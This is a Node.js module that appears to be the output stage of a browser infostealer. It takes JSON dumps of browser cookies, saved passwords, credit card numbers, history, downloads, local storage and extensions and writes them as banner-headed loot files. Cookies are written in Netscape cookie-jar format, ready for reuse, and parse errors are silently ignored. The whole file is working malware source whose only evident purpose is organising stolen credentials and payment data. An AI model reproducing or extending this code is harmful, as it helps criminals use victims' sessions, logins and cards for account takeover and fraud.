const fs = require('fs');
const path = require('path');

const BANNER = ` ____  __.                   
|    |/ _|____   ____  __ __ 
|      < /  _ \\ /    \\|  |  \\
|    |  (  <_> )   |  \\  |  /
|____|__ \\____/|___|  /____/ 
        \\/          \\/       

------------------------------------------
`;

function formatCookies(cookies) {
  let out = '';
  for (const item of cookies) {
    const rawUrl = item.url || item.host || '';
    let domain = rawUrl.replace(/^https?:\/\//, '').split('/')[0] || '';
    if (domain.includes('^')) domain = domain.split('^')[0];
    const key = item.key || item.name || '';
    const value = item.value || '';
    const pathStr = item.path || '/';
    const secure = item.is_secure ? 'TRUE' : 'FALSE';
    const expires = item.expire_at ? Math.floor(new Date(item.expire_at).getTime() / 1000) : 0;
    if (domain && key) {
      out += `${domain}\tTRUE\t${pathStr}\t${secure}\t${expires}\t${key}\t${value}\n`;
    }
  }
  return out;
}

function formatPasswords(passwords) {
  let out = BANNER;
  for (const item of passwords) {
    out += `URL: ${item.url || ''}\n`;
    out += `User: ${item.username || ''}\n`;
    out += `Pass: ${item.password || ''}\n`;
    out += `Browser: ${item.browser || ''} (${item.profile || ''})\n`;
    out += `--------------------------------------------------\n`;
  }
  return out;
}

function formatBookmarks(bookmarks) {
  let out = BANNER;
  for (const item of bookmarks) {
    out += `Title: ${item.name || ''}\n`;
    out += `URL: ${item.url || ''}\n`;
    out += `Folder: ${item.folder || ''}\n`;
    out += `Browser: ${item.browser || ''} (${item.profile || ''})\n`;
    out += `--------------------------------------------------\n`;
  }
  return out;
}

function formatHistory(history) {
  let out = BANNER;
  for (const item of history) {
    out += `Title: ${item.title || ''}\n`;
    out += `URL: ${item.url || ''}\n`;
    out += `Visit Count: ${item.visit_count || 0}\n`;
    out += `Browser: ${item.browser || ''} (${item.profile || ''})\n`;
    out += `--------------------------------------------------\n`;
  }
  return out;
}

function formatDownloads(downloads) {
  let out = BANNER;
  for (const item of downloads) {
    out += `URL: ${item.url || ''}\n`;
    out += `Path: ${item.target_path || item.path || ''}\n`;
    out += `Total Bytes: ${item.total_bytes || ''}\n`;
    out += `Browser: ${item.browser || ''} (${item.profile || ''})\n`;
    out += `--------------------------------------------------\n`;
  }
  return out;
}

function formatCreditCards(cards) {
  let out = BANNER;
  for (const item of cards) {
    out += `Name: ${item.name || ''}\n`;
    out += `Number: ${item.card_number || ''}\n`;
    out += `Expiry: ${item.expiry_month || ''}/${item.expiry_year || ''}\n`;
    out += `Browser: ${item.browser || ''} (${item.profile || ''})\n`;
    out += `--------------------------------------------------\n`;
  }
  return out;
}

function formatLocalStorage(storage) {
  let out = BANNER;
  for (const item of storage) {
    out += `Key: ${item.key || ''}\n`;
    out += `Value: ${item.value || ''}\n`;
    out += `Host: ${item.host || ''}\n`;
    out += `Browser: ${item.browser || ''} (${item.profile || ''})\n`;
    out += `--------------------------------------------------\n`;
  }
  return out;
}

function formatExtensions(extensions) {
  let out = BANNER;
  for (const item of extensions) {
    out += `Name: ${item.name || ''}\n`;
    out += `Description: ${item.description || ''}\n`;
    out += `Version: ${item.version || ''}\n`;
    out += `Browser: ${item.browser || ''} (${item.profile || ''})\n`;
    out += `--------------------------------------------------\n`;
  }
  return out;
}

function writeFile(folder, filename, content) {
  fs.mkdirSync(folder, { recursive: true });
  fs.writeFileSync(path.join(folder, filename), content, 'utf8');
}

function formatResults(targetDir, outputDir) {
  const searchDirs = [
    path.join(targetDir, 'results'),
    targetDir
  ];

  let resultsDir = null;
  for (const dir of searchDirs) {
    if (fs.existsSync(dir)) {
      const files = fs.readdirSync(dir);
      if (files.some(f => f.endsWith('.json'))) {
        resultsDir = dir;
        break;
      }
    }
  }

  if (!resultsDir) return [];

  if (!fs.existsSync(outputDir)) {
    fs.mkdirSync(outputDir, { recursive: true });
  }

  const files = fs.readdirSync(resultsDir);
  const jsonFiles = [];

  for (const file of files) {
    if (!file.endsWith('.json')) continue;

    const filePath = path.join(resultsDir, file);
    jsonFiles.push(filePath);

    try {
      const content = fs.readFileSync(filePath, 'utf8');
      const data = JSON.parse(content);
      if (!Array.isArray(data)) continue;

      const f = file.toLowerCase();

      if (f.includes('cookie')) {
        writeFile(path.join(outputDir, 'Cookies'), 'All-Cookies.txt', formatCookies(data));
      } else if (f.includes('password')) {
        writeFile(path.join(outputDir, 'Passwords'), 'All-Pass.txt', formatPasswords(data));
      } else if (f.includes('bookmark')) {
        writeFile(path.join(outputDir, 'Bookmarks'), 'All-Bookmarks.txt', formatBookmarks(data));
      } else if (f.includes('history')) {
        writeFile(path.join(outputDir, 'History'), 'All-History.txt', formatHistory(data));
      } else if (f.includes('download')) {
        writeFile(path.join(outputDir, 'Downloads'), 'All-Downloads.txt', formatDownloads(data));
      } else if (f.includes('credit') || f.includes('card')) {
        writeFile(path.join(outputDir, 'CreditCards'), 'All-Cards.txt', formatCreditCards(data));
      } else if (f.includes('localstorage') || f.includes('local_storage')) {
        writeFile(path.join(outputDir, 'LocalStorage'), 'All-LocalStorage.txt', formatLocalStorage(data));
      } else if (f.includes('extension')) {
        writeFile(path.join(outputDir, 'Extensions'), 'All-Extensions.txt', formatExtensions(data));
      }
    } catch (err) { }
  }

  return jsonFiles;
}

module.exports = { formatResults };
